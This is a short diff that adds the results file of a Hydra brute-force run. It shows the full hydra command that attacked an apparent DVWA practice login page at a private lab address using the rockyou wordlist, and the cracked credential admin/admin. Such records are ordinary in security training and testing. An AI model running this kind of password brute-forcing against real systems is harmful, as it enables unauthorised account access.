@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-06-10 20:00:30 on 10.0.2.3 http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -V -o scans/hydra_results.txt 10.0.2.3 http-post-form /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed)
+[80][http-post-form] host: 10.0.2.3   login: admin   password: admin
